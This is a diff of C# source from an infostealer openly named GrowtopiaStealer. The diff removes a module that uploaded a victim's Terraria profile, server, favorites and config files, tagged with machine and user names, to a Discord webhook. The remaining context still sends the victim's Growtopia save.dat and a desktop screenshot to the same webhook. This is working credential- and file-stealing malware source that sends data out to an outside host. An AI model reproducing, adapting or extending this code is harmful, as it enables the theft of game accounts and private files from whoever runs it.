@@ -322,26 +322,6 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                                )});
             #endregion
 
-            #region Terraria Message
-            var terraria = new DiscordMessage(
-                 "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
-                 username: "GrowtopiaStealer | TheC0mpany",
-                 avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
-                 tts: false,
-                 embeds: new[]{
-                    new DiscordMessageEmbed(
-                        "Terraria | GrowtopiaStealer",
-                        color: 65280,
-                        author: new DiscordMessageEmbedAuthor("Terraria - " + Environment.MachineName + " " + Environment.UserName),
-                        description:
-                        "\n ================================"
-                        ,
-                        thumbnail: new DiscordMessageEmbedThumbnail("https://cdn.discordapp.com/attachments/819331742212161576/877290738235351151/terraria.jpg"),
-                        image: new DiscordMessageEmbedImage("https://cdn.discordapp.com/attachments/819331742212161576/877299612392751124/terraria.gif"),
-                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
-                               )});
-            #endregion
-
             #region Sending logs
             client.SendToDiscord(rainbow);
             Thread.Sleep(500);
@@ -377,28 +357,6 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             string filename1 = "Screenshot-" + Environment.MachineName + ".png";
             string fileformat1 = "png";
             string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";
-
-            #region Terraria
-            string filename2 = "input profiles.json";
-            string fileformat2 = "json";
-            string filepath2 = Terraria.inputprofilesPathh;
-
-            string filename3 = "achievements.dat";
-            string fileformat3 = "dat";
-            string filepath3 = Terraria.achievementsPathh;
-
-            string filename4 = "servers.dat";
-            string fileformat4 = "dat";
-            string filepath4 = Terraria.serversPathh;
-
-            string filename5 = "favorites.json";
-            string fileformat5 = "json";
-            string filepath5 = Terraria.favoritesPathh;
-
-            string filename6 = "config.json";
-            string fileformat6 = "json";
-            string filepath6 = Terraria.configPathh;
-            #endregion
             try
             {
                 client.SendToDiscord(savedat);
@@ -407,26 +365,10 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
                 Thread.Sleep(1500);
                 client.SendToDiscord(rainbow);
                 Thread.Sleep(500);
-                client.SendToDiscord(terraria);
-                Thread.Sleep(500);
-                #region Terraria
-                DiscordWebhook.SendFile(mssgBody, filename2, fileformat2, filepath2, application); // 
-                Thread.Sleep(1500);
-                DiscordWebhook.SendFile(mssgBody, filename3, fileformat3, filepath3, application); // 
-                Thread.Sleep(1500);
-                DiscordWebhook.SendFile(mssgBody, filename4, fileformat4, filepath4, application); // 
-                Thread.Sleep(1500);
-                DiscordWebhook.SendFile(mssgBody, filename5, fileformat5, filepath5, application); // 
-                Thread.Sleep(1500);
-                DiscordWebhook.SendFile(mssgBody, filename6, fileformat6, filepath6, application); // 
-                Thread.Sleep(1500);
-                #endregion
-                client.SendToDiscord(rainbow);
-                Thread.Sleep(1500);
             }
             catch
             {
-                DiscordWebhook.Send("Terraria doesn't exists.");
+                DiscordWebhook.Send("save.dat doesn't exists.");
             }
             try
             {
